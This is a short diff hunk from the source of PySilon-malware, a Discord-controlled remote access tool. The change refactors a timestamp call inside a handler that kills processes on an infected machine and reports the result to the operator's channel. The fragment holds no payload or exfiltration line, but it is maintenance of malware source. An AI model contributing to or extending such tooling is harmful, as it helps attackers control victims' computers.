@@ -111,7 +111,7 @@ async def kill_running_process(ctx, argument=None):
                             processes_killed = ''
                             for i in killed_processes:
                                 processes_killed = processes_killed + '\n• ' + str(i)
-                            embed = discord.Embed(title="🟢 Success",description=f'```Processes killed by ' + str(user) + ' at ' + current_time() + processes_killed + '```', colour=discord.Colour.green())
+                            embed = discord.Embed(title="🟢 Success",description=f'```Processes killed by ' + str(user) + ' at ' + pysilon_misc.current_time() + processes_killed + '```', colour=discord.Colour.green())
                             embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
                             await reaction.message.channel.send(embed=embed)
                         except Exception as e:
